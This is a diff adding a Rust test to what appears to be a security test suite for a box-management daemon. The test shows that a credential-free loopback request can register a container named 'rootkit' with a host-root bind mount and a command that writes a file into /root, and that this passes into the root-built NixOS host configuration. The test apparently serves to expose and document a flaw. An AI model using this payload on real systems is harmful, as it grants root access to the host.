@@ -252,3 +252,58 @@ async fn source_path_exfil_variants() {
         "symlink exfil should have worked, got {s} {b}"
     );
 }
+
+/// The escalation-to-root primitive: a credential-free loopback caller writes a
+/// container service with a host-root bind mount into box.toml, and that lands
+/// verbatim in the generated NixOS host repo — which the (also loopback-
+/// reachable) POST /system/update hands to the ROOT boxd-channel-update unit.
+#[tokio::test]
+async fn loopback_can_write_a_root_bind_mount_into_the_system_config() {
+    let (tmp, paths, app) = app();
+
+    let (s, b, _) = send(
+        &app,
+        Request::post("/api/v1/services")
+            .header("content-type", "application/json")
+            .extension(loopback())
+            .body(Body::from(
+                json!({
+                    "name": "rootkit",
+                    "template": "container",
+                    "params": {
+                        "image": "alpine:3",
+                        "container_port": 80,
+                        "volumes": ["/:/host"],
+                        "cmd": ["sh", "-c", "cp /bin/busybox /host/root/pwned"]
+                    }
+                })
+                .to_string(),
+            ))
+            .unwrap(),
+    )
+    .await;
+    println!("[root] LOOPBACK POST /api/v1/services (container, volumes=/:/host) -> {s} {b}");
+    assert_eq!(s, StatusCode::OK, "no validation rejects a host-root mount");
+
+    // It is now in the box's declarative config.
+    let toml = std::fs::read_to_string(paths.config_file()).unwrap();
+    println!("[root] box.toml now contains:\n{toml}");
+    assert!(toml.contains("/:/host"));
+
+    // And it compiles into the NixOS host repo that the ROOT update unit builds.
+    let out = tmp.path().join("hostrepo");
+    let config = boxd::config::BoxConfig::load(&paths).unwrap();
+    let ch = boxd::channel::ChannelConfig::load(&paths)
+        .unwrap()
+        .unwrap_or_else(|| boxd::channel::ChannelConfig::new("demo-box"));
+    let spec = ch.spec();
+    boxd::hostgen::write_host_repo(&paths, &config, &spec, &out).unwrap();
+    let module = std::fs::read_to_string(
+        out.join("nodes/hosts")
+            .join(&ch.host_id)
+            .join("services/rootkit.nix"),
+    )
+    .unwrap();
+    println!("[root] generated module:\n{module}");
+    assert!(module.contains(r#""/:/host""#), "host-root mount compiled in");
+}
